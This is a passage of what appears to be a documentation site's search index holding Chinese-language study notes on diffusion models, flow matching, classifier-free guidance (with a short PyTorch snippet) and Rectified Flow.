path\uff09\uff0c\u4e5f\u5373\u4e00\u4e2a\u70b9\u7684\u6982\u7387\u8def\u5f84\uff0c\u6bd4\u5982\u4e00\u5f20\u56fe\u7247\u5230\u4e00\u4e2a\u9ad8\u65af\u566a\u58f0\u7684\u8def\u5f84</p> <p></p> <p>\u5176\u6b21\u6211\u4eec\u5b9a\u4e49\u8fb9\u9645\u6982\u7387\u8def\u5f84\uff0c\u4e5f\u5373\u5bf9\u4e8e\u6574\u4e2a\u771f\u5b9e\u7684\u6570\u636e\u96c6\u7684\u8f6c\u6362\uff0c\u5c06\u6574\u4e2a\u771f\u5b9e\u7684\u6570\u636e\u96c6\u53d8\u4e3a\u9ad8\u65af\u566a\u58f0\uff0c\u5b9e\u9645\u4e0a\u5bf9\u4e8e\u7279\u5b9a\u65f6\u95f4t\u7684\u6982\u7387\u5206\u5e03\uff0c\u5c31\u662f\u5bf9\u4e8e\u8be5t\u65f6\u95f4\u7684\u6761\u4ef6\u6982\u7387\u53bb\u6c42\u79ef\u5206\u5f97\u5230\u8fb9\u9645\u6982\u7387</p> <p></p> <p>\u5bf9\u4e8e\u8fd9\u4e24\u79cd\u6982\u7387\u8def\u5f84\u7684\u5bf9\u6bd4\uff0c\u6211\u4eec\u53ef\u4ee5\u53c2\u7167\u8fd9\u4e2a\u56fe</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u4e0a\u9762\u4e00\u76f4\u63d0\u5230\u9ad8\u65af\u566a\u58f0\uff0c\u53ea\u662f\u4e3a\u4e86\u548c\u5927\u5bb6\u719f\u6089\u7684Diffusion\u8054\u7cfb\u8d77\u6765\u7f62\u4e86\uff0c\u521d\u59cb\u5206\u5e03\u4e0d\u4e00\u5b9a\u9700\u8981\u662f\u9ad8\u65af</p> <p>\u5bf9\u4e8e\u6982\u7387\u5206\u5e03\u7684\u53d8\u5316\uff0c\u4e5f\u53ef\u4ee5\u53c2\u7167\u8fd9\u4e2a\u56fe\uff0c\u80cc\u666f\u4e2d\u7684\u7ea2\u8272\u5757\u662f\u6307\u521d\u59cb\u7684\u9ad8\u65af\u5206\u5e03\uff0c\u4e94\u89d2\u7684\u84dd\u8272\u5757\u662f\u6700\u7ec8\u7684\u771f\u5b9e\u5206\u5e03</p> <p></p> <p>\u5bf9\u4e8eDiffusion\u7684\u7248\u672c\uff0c\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u4f8b\u5b50Gaussian Conditional Probability Path</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#32-conditional-and-marginal-vector-fields","title":"3.2 Conditional and Marginal Vector Fields","text":"<p>\u6982\u7387\u8def\u5f84\u662f\u6211\u4eec\u5df2\u6709\u7684\uff0c\u4e5f\u5373\u52a0\u566a\u8fc7\u7a0b\uff0c\u52a0\u566a\u8fc7\u7a0b\u7684\u9006\u5411\uff0c\u5c31\u662f\u6211\u4eec\u5df2\u6709\u7684\u6982\u7387\u8def\u5f84\uff0c\u4e5f\u662f\u8bad\u7ec3\u7684\u6570\u636e\u96c6\u5408\uff1b\u800c\u5411\u91cf\u573a\u662f\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u6807\uff0c\u6211\u4eec\u9700\u8981\u8bad\u7ec3\u795e\u7ecf\u7f51\u7edc\u6765\u62df\u5408\u5411\u91cf\u573a\uff0c\u4f7f\u5176\u91c7\u6837\u7684\u65f6\u5019\u751f\u6210\u7684\u8f68\u8ff9\u5206\u5e03\uff0c\u7b26\u5408\u6211\u4eec\u5df2\u6709\u7684\u6982\u7387\u8def\u5f84</p> <p>\u6211\u4eec\u5728\u4e0a\u6587\u4e2d\u5b9a\u4e49\u6982\u7387\u8def\u5f84\u7684\u65f6\u5019\u91c7\u7528\u4e86\u63d2\u503c\u6cd5\uff0c\u8fd9\u662f\u7ecf\u8fc7\u4eba\u4e3a\u8bbe\u8ba1\u7684\u7ed3\u679c</p> <p>\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7\u5df2\u6709\u7684\u6982\u7387\u8def\u5f84  \\(p_t\\) \u6765\u6784\u9020vector fields\uff0c\u5bf9\u4e8e\u6761\u4ef6\u6982\u7387\u8def\u5f84\u548c\u6761\u4ef6\u5411\u91cf\u573a\u7684\u5173\u7cfb\u6211\u4eec\u6709</p> <p></p> <p>\u4e0a\u8ff0\u516c\u5f0f\u8868\u793a\u5bf9\u7279\u5b9a\u7684\u6570\u636e\u70b9\u7684\u8fd0\u52a8\u5173\u7cfb\uff0c\u975e\u5e38\u6e05\u6670\uff0c\u4f46\u662f\u5bf9\u4e8e\u5b9e\u9645\u7684 \\(u_t^{target}(x)\\) \u5374\u5f88\u96be\u6c42\u89e3\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e00\u4e9b\u6280\u5de7\u6765\u8fdb\u884c\u6784\u9020</p> <ul> <li>\u5176\u4e2dExample11\u8ba9\u6211\u4eec\u4ece\u9ad8\u65af\u7684ODE\u4e2d\u83b7\u53d6\u6761\u4ef6\u6982\u7387\u8def\u5f84\u7684\u6570\u5b66\u7ed3\u679c\uff0c\u5176\u4e2d\u7684 \\(\\dot{a}_t\\) \u662f\u6307a\u5bf9t\u7684\u5bfc\u6570</li> </ul> <p></p> <p>\u6211\u4eec\u6765\u5f15\u5165\u8fde\u7eed\u6027\u65b9\u7a0b\uff0c\u8fde\u7eed\u6027\u65b9\u7a0b\u63cf\u8ff0\u4e86\u5728\u4e00\u4e2a\u6d41\u573a\u4e2d\uff0c\u6982\u7387\u5bc6\u5ea6\u7684\u53d8\u5316\u7387\u548c\u5176\u901a\u91cf\u6563\u5ea6\u7684\u5173\u7cfb\uff0c\u5728\u8fd9\u91cc\u662f\u6307\u6982\u7387\u8def\u5f84\u548c\u5411\u91cf\u573a\u7684\u5173\u7cfb\uff0c\u4ec0\u4e48\u6837\u7684\u5411\u91cf\u573a\u624d\u80fd\u4ea7\u751f\u5bf9\u5e94\u7684\u6982\u7387\u8def\u5f84</p> <p></p> <p>\u4e3a\u4e86\u7406\u89e3\u8fde\u7eed\u6027\u65b9\u7a0b\uff0c\u6211\u4eec\u8981\u5f15\u5165 \\(div\\) \u7684\u6982\u5ff5\uff0cdiv\u662f\u4e00\u4e2a\u8868\u793adivergence\u7684\u6982\u5ff5\uff0c\u6563\u5ea6</p> <p></p> <p>\u5bf9\u4e8e\u8fde\u7eed\u6027\u65b9\u7a0b\uff0c\u5de6\u4fa7\u7684\u5f0f\u5b50\u7b49\u540c\u4e8e\u6982\u7387\u8def\u5f84 \\(p_t(x)\\)\u5728\u65f6\u95f4\u4e0a\u7684\u5bfc\u6570/\u53d8\u5316\u7387\uff0c\u53f3\u4fa7\u7684\u6982\u7387\u6563\u5ea6\u8868\u793a\u6982\u7387\u8d28\u91cf\u7684\u51c0\u6d41\u51fa</p> <p>\u968f\u540e\u6211\u4eec\u53ef\u4ee5\u7528\u8fde\u7eed\u6027\u65b9\u7a0b\u6c42\u89e3\u8fb9\u9645\u5411\u91cf\u573a</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#33-conditional-and-marginal-score-functions","title":"3.3 Conditional and Marginal Score Functions","text":"<p>\u5148\u524d\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u5b9a\u4e49\u4e86\u5411\u91cf\u573a\uff0c\u8ddf\u968f\u8fd9\u4e2a\u5411\u91cf\u573a\uff0c\u6211\u4eec\u5c31\u80fd\u628a\u521d\u59cb\u5206\u5e03\u8f6c\u79fb\u5230\u771f\u5b9e\u5206\u5e03\u3002</p> <p>\u4f46\u662f\u5bf9\u4e8eSDE\u6765\u8bf4\uff0c\u7531\u4e8e\u5f15\u5165\u4e86\u968f\u673a\u6269\u6563\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u5176\u5982\u679c\u6309\u7167\u8fd9\u4e2a\u5411\u91cf\u573a\u7684\u8bdd\uff0c\u6700\u7ec8\u5730\u5206\u5e03\u4f1a\u6bd4\u771f\u5b9e\u5206\u5e03\u66f4\u53d1\u6563\uff0c\u8fd9\u4e2aScore Function\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u7528\u4e8e\u62b5\u6d88\u968f\u673a\u6269\u6563\u5730\u5f71\u54cd</p> <p>Score\u662f\u8868\u793a\u5206\u5e03\u7684\u79fb\u52a8\u7684\u5bfc\u6570\uff0c\u800cFlow\u4e2d\u7684u\u662f\u5177\u4f53\u7684\u70b9\u8fd0\u52a8\u7684\u5bfc\u6570</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#4-training-the-generative-model","title":"4. Training the Generative Model","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#42-cfg","title":"4.2 CFG","text":"<p>CFG \u662f\u6307\u5206\u7c7b\u65e0\u5173\u77e5\u9053Classifier-Free Guidance\uff0c\u662f\u4e3a\u4e86\u8ba9Text2Image\u8fd9\u7c7b\u5f97\u6a21\u578b\uff0c\u5728\u751f\u6210\u7684\u6307\u4ee4\u9075\u5faa\u6027\u548c\u751f\u6210\u7684\u591a\u6837\u6027+\u8d28\u91cf\u4e0a\u8fbe\u5230\u4e00\u4e2a\u5e73\u8861</p> <p></p> <p>\u5176\u65b9\u5f0f\u662f\u8bb2\u6700\u7ec8\u9884\u6d4b\u7684\u566a\u58f0\u8f6c\u6362\u6210\u4e0a\u8ff0\u5f62\u5f0f</p> <pre><code># \u540c\u65f6\u524d\u5411\u4f20\u64ad\u4e24\u6b21\nnoise_pred = self.transformer(\n  hidden_states=torch.cat([latents, latents], dim=0),  # \u590d\u5236\u4e00\u4efdlatents\n  timestep=torch.cat([timestep, timestep], dim=0) / 1000,\n  guidance=guidance,\n  encoder_hidden_states_mask=torch.cat([prompt_embeds_mask, negative_prompt_embeds_mask], dim=0),\n  encoder_hidden_states=torch.cat([prompt_embeds, negative_prompt_embeds], dim=0),  # \u7b2c\u4e00\u4efd\u7528\u6b63\u5411\u63d0\u793a\uff0c\u7b2c\u4e8c\u4efd\u7528\u8d1f\u5411\u63d0\u793a\n  img_shapes=img_shapes*2,\n  txt_seq_lens=txt_seq_lens+negative_txt_seq_lens,\n)[0]\n</code></pre> <p>\u6211\u4eec\u5728\u524d\u5411\u7684\u65f6\u5019\uff0c\u4f1a\u590d\u5236\u4e00\u4efdlatents\uff0c\u7136\u540e\u7528\u4e0d\u540c\u7684prompt_embed\u6765\u505a\u9884\u6d4b\uff0c\u5b8c\u6210\u4e4b\u540e\u628a\u9884\u6d4b\u7684\u7ed3\u679c\u62c6\u5f00\uff0c\u7136\u540e\u7528CFG\u516c\u5f0f\u62fc\u8d77\u6765</p> <pre><code>noise_pred, neg_noise_pred = noise_pred.chunk(2, dim=0)\ncomb_pred = neg_noise_pred + true_cfg_scale * (noise_pred - neg_noise_pred)\n</code></pre> <p>\u5b8f\u89c2\u4e0a\u6d41\u7a0b\u53ef\u4ee5\u5982\u4e0b</p> <pre><code>  # \u8f93\u5165\uff1a\n  \u6b63\u5411\u63d0\u793a: \"a beautiful cat sitting on grass\"\n  \u8d1f\u5411\u63d0\u793a: \"\"\n\n  # \u6b65\u9aa4 1\uff1a\u524d\u5411\u4f20\u64ad\n  noise_pred = Transformer([\u6b63\u5411prompt\u7f16\u7801])      # \u2192 \u9884\u6d4b\u566a\u58f0 A\n  neg_noise_pred = Transformer([\u8d1f\u5411prompt\u7f16\u7801])  # \u2192 \u9884\u6d4b\u566a\u58f0 B\n\n  # \u6b65\u9aa4 2\uff1a\u8ba1\u7b97\u5f15\u5bfc\u65b9\u5411\n  direction = noise_pred - neg_noise_pred  # \"\u671d\u7740\u732b\u7684\u65b9\u5411\" vs \"\u671d\u7740\u6a21\u7cca\u56fe\u7684\u53cd\u65b9\u5411\"\n\n  # \u6b65\u9aa4 3\uff1a\u653e\u5927\u5f15\u5bfc\uff08\u5047\u8bbe scale=4.0\uff09\n  comb_pred = neg_noise_pred + 4.0 * direction  # \u5f3a\u5316\"\u732b\"\u7684\u7279\u5f81\n\n  # \u6b65\u9aa4 4\uff1a\u8303\u6570\u5f52\u4e00\u5316\uff08True CFG\uff09\n  comb_pred = comb_pred * (||noise_pred|| / ||comb_pred||)  # \u63a7\u5236\u5e45\u5ea6\n\n  # \u6b65\u9aa4 5\uff1a\u53bb\u566a\n  latents = SDE_step(latents, comb_pred, timestep)  # \u5411\u66f4\"\u732b\"\u7684\u65b9\u5411\u53bb\u566a\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#43-a-guide-to-the-diffusion-model-literature","title":"4.3 A Guide to the Diffusion Model Literature","text":"<p>\u7531\u4e8e\u795e\u7ecf\u7f51\u7edc\u9886\u57df\u5f80\u5f80\u6709\u5b9e\u9a8c\u5148\u884c\u7406\u8bba\u843d\u540e\u5730\u60c5\u51b5\uff0c\u5bfc\u81f4\u540c\u4e00\u4e2a\u9886\u57df\u5f80\u5f80\u6709\u597d\u591a\u5957\u7684\u7406\u8bba\u89e3\u8bfb\uff0c\u8fd9\u4e5f\u662f\u4e00\u4e2a\u9010\u6e10\u6210\u719f\u7684\u8fc7\u7a0b\uff0c\u672c\u7ae0\u8282\u4e3a\u51fa\u73b0\u7684\u4e00\u7cfb\u5217\u65b9\u6848\u8fdb\u884c\u8fa8\u6790</p> <p>Discrete time &amp; continuous time</p> <p>\u65e9\u671f\u7684\u8bba\u6587\u91cc\u7528\u6765Markov chains\u6765\u89e3\u8bfbDiffusions\uff0c\u8fd9\u662f\u4e00\u79cd\u79bb\u6563\u65f6\u95f4\u7684\u8868\u8fbe\uff0c\u5728\u8fd9\u79cd\u89e3\u8bfb\u4e2d\uff0cLoss Function\u662f\u901a\u8fc7\u4f18\u5316ELBO\u8fd9\u4e00\u4e0b\u9650\u6765\u8fd1\u4f3c\u3002\u540e\u7eed\u7684\u5de5\u4f5c\u8bc1\u660e\u8fd9\u79cd\u65b9\u6848\u672c\u8d28\u662f\u5bf9SDE\u7684\u8fd1\u4f3c\uff0c\u5728\u8fde\u7eed\u7684\u65f6\u95f4\u4e0b\uff0cELBO\u53d8\u4e3a\u5b9e\u9645\u7684\u7ed3\u679c\u800c\u975e\u4e0b\u754c\uff08\u8f6c\u6362\u4e3a\u4e00\u4e2a\u7b49\u5f0f\uff09</p> <p>\u5728\u65e9\u671f\u4eba\u4eec\u5c06\u6269\u6563\u6a21\u578b\u7684\u76ee\u6807\u7406\u89e3\u4e3a\u9884\u6d4b\u566a\u58f0\uff0c\u800c\u5b9e\u9645\u4e0a\u6765\u8bf4\u5e94\u8be5\u662f\u9884\u6d4b\u901f\u5ea6\uff0c\u9884\u6d4b\u566a\u58f0\u662f\u4e00\u79cd\u66f4\u52a0\u4f4e\u6548\u7684\u505a\u6cd5</p> <p>Forward process &amp; probability paths</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#5-rethink-diffusion-model","title":"5. Rethink Diffusion Model","text":"<p>\u4e0a\u8ff0\u5185\u5bb9\u662fDiffusion Model\u7406\u8bba\u4e2d\u7684\u60c5\u5f62\uff0c\u4f46\u662f\u5230\u4e86\u771f\u5b9e\u7684\u9ad8\u7ef4\u7684\u6570\u636e\u5206\u5e03\u4e2d\uff0c\u4e0e\u7406\u8bba\u4f1a\u51fa\u73b0\u51fa\u5165</p> <p></p> <p>\u771f\u5b9e\u7684\u9ad8\u7ef4\u6570\u636e\u5206\u5e03\u4e2d\uff0c\u6570\u636e\u70b9\u5206\u5e03\u8f83\u4e3a\u7a00\u758f\uff0c\u5728\u566a\u58f0\u5e45\u5ea6\u8f83\u4f4e\u65f6\u5019\uff0c\u6a21\u578b\u51e0\u4e4e\u6ca1\u6709\u518d\u9884\u6d4b\u6574\u4e2a\u6570\u636e\u5206\u5e03\u7684\u5747\u503c\uff0c\u800c\u662f\u9884\u6d4b\u6700\u8fd1\u7684\u5355\u4e2a\u6837\u672c\uff0c\u4e0a\u8ff0\u5b9e\u9a8c\u5c55\u73b0\u4e86\u4ee5\u4e0b\u5185\u5bb9</p> <ul> <li>\u5728\u4f4e\u7ef4\uff0c\u4f4e\u5206\u8fa8\u7387\u7684\u5b9e\u9a8c\u4e2d\uff0c\u6a21\u578b\u7684\u9884\u6d4b\u4fdd\u6301\u4e00\u4e2a\u5e73\u6ed1\u7684\u5206\u5e03\uff0c\u4f46\u662f\u5230\u4e86ImageNet\u8fd9\u4e9b\u9ad8\u7ef4\u5b9e\u9a8c\u4e2d\uff0c\u6a21\u578b\u7684\u9884\u6d4b\u5230\u4e00\u4e2a\u4f4e\u566a\u533a\u95f4\u91cc\u4f1a\u8fc5\u901f\u9510\u5316</li> <li>\u968f\u7740\u5206\u8fa8\u7387\u7684\u63d0\u5347\uff08ImageNet256-&gt;512\uff09\uff0c\u6a21\u578b\u7684\u9884\u6d4b\u8d8a\u6765\u8d8a\u5bb9\u6613\u9000\u5316\uff0c\u5373\u4fbf\u662f\u5728\u8f83\u5927\u7684\u566a\u58f0\u8303\u56f4\u5185</li> </ul> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4e0a\u8ff0\u5b9e\u9a8c\u76f4\u63a5\u5728\u50cf\u7d20\u7a7a\u95f4\u4e2d\u8bad\u7ec3\u4e86\u751f\u6210\u6a21\u578b\uff0c\u6ca1\u6709\u4f7f\u7528VAE\uff0c\u8fd9\u4e2a\u5b9e\u9a8c\u4e5f\u8bc1\u660e\u4e86VAE\u7684\u538b\u7f29\u5bf9\u4e8e\u751f\u6210\u6a21\u578b\u8bad\u7ec3\u7684\u91cd\u8981\u6027\uff0c\u4f46\u662f\u4f20\u7edf\u7684\u7406\u8bba\u5206\u6790\u5f80\u5f80\u5ffd\u7565\u4e86\u8fd9\u4e00\u70b9</p> <p>\u5728\u8fd9\u91cc\u8bba\u6587\u63d0\u51fa\u4e00\u4e2a\u65b0\u7684\u89c6\u89d2\u6765\u7406\u89e3\u751f\u6210\u6a21\u578b\uff0c\u4ece\u4fe1\u53f7\u7684\u89d2\u5ea6\uff0c\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u56fe\u50cf\u53ef\u4ee5\u533a\u5206\u4e3a\u4e24\u90e8\u5206</p> <ul> <li>\u4f4e\u9891 \u5927\u5757\u7684\u8272\u5757</li> <li>\u9ad8\u9891 \u56fe\u50cf\u7684\u7ec6\u8282\uff0c\u8fb9\u7f18\uff0c\u7eb9\u7406</li> </ul> <p>\u5728\u9ad8\u566a\u58f0\u73af\u8282\uff0c\u6a21\u578b\u53bb\u9884\u6d4b\u4f4e\u9891\u7ec6\u8282\uff0c\u4e5f\u5c31\u662f\u8272\u5757\uff0c\u800c\u5728\u4f4e\u566a\u58f0\u73af\u8282\uff0c\u6a21\u578b\u6267\u884c\u9ad8\u9891\u7684\u7ec6\u8282\u8865\u5168\u3002\u8fd9\u662f\u975e\u5e38\u663e\u7136\u7684\uff0c\u56e0\u4e3a\u5728MSE\u7684\u8bad\u7ec3\u4e2d\uff0c\u9ad8\u566a\u58f0\u73af\u8282\u53ea\u6709\u4f4e\u9891\u7ec6\u8282\u8fd8\u4fdd\u5b58\u7740\uff0c\u53ea\u6709\u4f4e\u566a\u58f0\u73af\u8282\u4e2d\u6a21\u578b\u624d\u80fd\u5b66\u4e60\u5230\u9ad8\u9891\u7684\u5185\u5bb9</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Dit/","title":"Dit","text":"<p>Dit \u662f\u73b0\u9636\u6bb5\u751f\u6210\u6a21\u578b\u6700\u5e38\u89c1\u7684\u6a21\u578b\u67b6\u6784\uff0c\u53ef\u4ee5\u53c2\u8003\u8fd9\u4e9bcodebase</p> <ul> <li>Huggingface diffusers</li> <li>lighting dit</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Rectified%20Flow/","title":"Rectified Flow","text":"<p>Rectified Flow\uff1a\u77eb\u6b63\u6d41\u751f\u6210\u5f0f\u6a21\u578b\u7684\u6982\u5ff5\u53ca\u5e94\u7528\u5b9e\u8df5\uff5c\u9752\u7a1eTalk 31\u671f_\u54d4\u54e9\u54d4\u54e9_bilibili </p> <p>\u4e0a\u9762\u8fd9\u4e2a\u89c6\u9891\u662fRectified Flow\u7684\u4f5c\u8005\u4e4b\u4e00\u7684\u4e00\u4e2atalk\uff0c\u975e\u5e38\u6e05\u6670\u5730\u8bb2\u8ff0\u4e86Flow Matching\u548cRectified Flow\u7684\u6982\u5ff5\uff0c\u7ed5\u8fc7\u4e86Diffusion\uff0cODE/SDE\u7b49\u4e00\u7cfb\u5217\u590d\u6742\u7684\u6570\u5b66\u6982\u5ff5\uff0c\u76f4\u89c2\u7684\u5207\u5165\u4e86Flow\u7684\u6982\u5ff5</p> <p></p> <p>\u4e0a\u56fe\u662f\u4ed6\u5728\u5f15\u5165\u90e8\u5206\uff0c\u5bf9\u4e8e\u6574\u4e2a\u751f\u6210\u6a21\u578b\u9886\u57df\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u6982\u62ec \u65e9\u671f</p> <ul> <li>Normalizing Flow</li> <li>GAN</li> <li>VAE</li> <li>EBM</li> </ul> <p>\u73b0\u9636\u6bb5</p> <ul> <li>AutoRegressive</li> <li>Diffusion</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Rectified%20Flow/#1-reflow","title":"1. ReFlow \u7406\u8bba","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u770bDiffusion\u4e3a\u4ee3\u8868\u7684\u4e00\u7cfb\u5217\u751f\u6210\u6a21\u578b\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u5c06\u4e00\u4e2a\u5206\u5e03\uff08\u4e00\u822c\u662f\u9ad8\u65af\uff09\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u5206\u5e03\uff08\u771f\u5b9e\u6570\u636e\u4ee3\u8868\u7684\u5206\u5e03\uff0c\u6bd4\u5982\u56fe\u7247\uff0c\u86cb\u767d\u8d28\u5206\u5b50\u7b49\u7b49\uff09</p> <p></p> <p>\u6700\u7b80\u5355\u7684\u60c5\u51b5\u5982\u4e0a\uff0c\u6bd4\u5982\u771f\u5b9e\u5206\u5e03\u53ea\u6709\u4e00\u4e2a\u70b9\uff0c\u90a3\u4e48\u6574\u4e2a\u8fc7\u7a0b\u5f88\u597d\u5b66\u4e60\uff0c\u4e00\u5207\u90fd\u79fb\u52a8\u5411\u540c\u4e00\u4e2a\u70b9\u5373\u53ef\uff0c\u4e0b\u9762\u6574\u4e2a\u5f0f\u5b50\u5c31\u662f\u6211\u4eec\u7684Loss</p> <p>\u4f46\u662f\u5f53\u6211\u4eec\u7684\u5206\u5e03\u590d\u6742\u4e00\u70b9\uff0c\u6bd4\u5982\u6709\u4e24\u4e2a\u70b9\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e00\u70b9\u95ee\u9898\uff0c\u4e0b\u56fe\u4e2d\u6211\u4eec\u4f1a\u5e0c\u671b\u521d\u59cb\u5206\u5e03\u5c3d\u53ef\u80fd\u79fb\u52a8\u5411\u8fd9\u4e24\u4e2a\u70b9</p> <p></p> <p>\u8fd9\u4e2a\u65f6\u5019\u89e3\u51b3\u8fd9\u4e2aLoss\uff0c\u6211\u4eec\u7684\u5206\u5e03\u4f1a\u53d8\u6210\u4ec0\u4e48\u6837\uff0c\u5b9e\u9645\u4f1a\u53d8\u6210\u4e0b\u56fe\u8fd9\u6837\uff0c\u56e0\u4e3a\u6211\u4eec\u6b64\u65f6\u7684\u79fb\u52a8\u662f\u4e00\u6761\u76f4\u7ebf\uff0c\u5176\u4f1a\u53d8\u6210\u4e24\u4e2a\u70b9\u7684\u5e73\u5747\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728VAE\u4e2d\u7ecf\u5e38\u770b\u5230\u7684\u7ed3\u679c</p> <p> </p> <p>\u4e0a\u8ff0\u95ee\u9898\u51fa\u5728\u54ea\u5462\uff0c\u539f\u56e0\u5728\u4e8e\u6211\u4eec\u5f3a\u5236\u4e86\u8fd9\u4e2a\u79fb\u52a8\u662f\u4e00\u6761\u76f4\u7ebf\uff0c\u4e5f\u5373\u5176\u901f\u5ea6\u7684\u65b9\u5411\u662f\u4e0d\u53d8\u7684\uff0c\u5982\u679c\u6211\u4eec\u53bb\u6389\u8fd9\u4e2a\u524d\u63d0\uff0c\u518d\u6765\u770b\u770b\uff08\u5176\u5b9e\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u628a\u79bb\u6563\u8f6c\u6362\u6210\u8fde\u7eed\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u4e4b\u524d\u5047\u8bbe\u7684\u60c5\u51b5\u5e76\u975e\u79fb\u52a8\uff0c\u800c\u662f\u8dc3\u8fc1\uff0c\u79fb\u52a8\u672c\u8eab\u5e94\u5f53\u662f\u8fde\u7eed\u7684\uff09</p> <p>\u56e0\u4e3a\u6211\u4eec\u5728\u8ba1\u7b97\u673a\u4e0a\u4e0d\u80fd\u5c06\u8fd0\u52a8\u8fc7\u7a0b\u65e0\u9650\u5fae\u5206\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u8fdb\u884c\u9ad8\u65af\u63d2\u503c\u6765\u6a21\u62df\u8fde\u7eed\u7684\u8fd0\u52a8</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u6c42\u89e3\u4e0a\u8ff0\u7ed3\u679c\u4e4b\u540e\uff0c\u6211\u4eec\u7684\u901f\u5ea6\u573a\u5e73\u5747\u4e0b\u6765\u662f\u8fd9\u6837\u7684</p> <p></p> <p>\u8fd9\u4e2a\u7ed3\u679c\u5c31\u975e\u5e38\u7b26\u5408\u6211\u4eec\u7684\u76ee\u6807\uff0c\u8fd9\u4e5f\u662f\u8bf4\u660e\u4e3a\u4ec0\u4e48\u6211\u4eec\u5728\u505aDiffusion\u6216\u662fFlow\u7684\u65f6\u5019\u8981\u5206\u591a\u6b65\uff0c\u800c\u4e0d\u662f\u4e00\u6b65\u5230\u4f4d\u7684\u539f\u56e0\uff0c\u4e00\u6b65\u5230\u4f4d\u7684\u79fb\u52a8\u5f80\u5f80\u4f1a\u5bfc\u81f4\u6211\u4eec\u91c7\u6837\u5230\u771f\u5b9e\u6570\u636e\u5206\u5e03\u7684\u4e00\u4e2a\u5e73\u5747</p> <p>\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u66f4\u52a0\u660e\u663e\u5730ODE\u5730\u4f8b\u5b50</p> <p></p> <p>\u5728\u4e0a\u56fe\u4e2d\uff0c\u6211\u4eec\u5bf9\u6bd4\u4e86\u771f\u5b9e\u5730ODE\u548c\u5b66\u4e60\u51fa\u6765\u5730Flow\u7684\u7ed3\u679c\uff0c\u5f88\u660e\u663e\u53ef\u4ee5\u89c2\u5bdf\u5230\u4ea4\u53c9\u70b9\u7684\u4e0d\u540c\uff0c\u5b66\u4e60\u5230\u7684Flow\u4e2d\uff0c\u5de6\u4e0b\u89d2\u7684\u7d2b\u8272\u5206\u5e03\u6709\u65f6\u4f1a\u5411\u4e2d\u95f4\u79fb\u52a8\u4e00\u6bb5\u8ddd\u79bb\uff0c\u518d\u5f80\u53f3\u4e0b\u89d2\u7684\u7ea2\u8272\u5206\u5e03\u8fdb\u884c\u79fb\u52a8</p> <p>\u7ad9\u5728\u4e0a\u5e1d\u89c6\u89d2\u6211\u4eec\u53ef\u4ee5\u5f88\u76f4\u89c2\u7684\u53d1\u73b0\uff0c\u5de6\u4e0b\u89d2\u7684\u7d2b\u8272\u5206\u5e03\uff0c\u4ed6\u5c31\u9002\u5408\u79fb\u52a8\u5230\u53f3\u4e0b\u89d2\uff0c\u5de6\u4e0a\u89d2\u7684\u7d2b\u8272\u5206\u5e03\uff0c\u5c31\u9002\u5408\u79fb\u52a8\u5230\u53f3\u4e0a\u89d2\uff0c\u4f46\u662f\u518d\u8bad\u7ec3\u4e2d\u8fd9\u4e00\u70b9\u662f\u672a\u77e5\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u5c3d\u53ef\u80fd\u5730\u8ba9\u7d2b\u8272\u5206\u5e03\u7684\u5168\u90e8\u90fd\u5f80\u7ea2\u8272\u5206\u5e03\u79fb\u52a8\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86\u8bad\u7ec3\u51fa\u6765\u7684\u7ed3\u679c\u867d\u7136\u597d\uff0c\u4f46\u662f\u8d70\u4e86\u5f2f\u8def\u3002\u7406\u60f3\u7684\u60c5\u51b5\u5e94\u8be5\u662f\u4e0b\u56fe\u7b2c\u4e09\u5f20</p> <p></p> 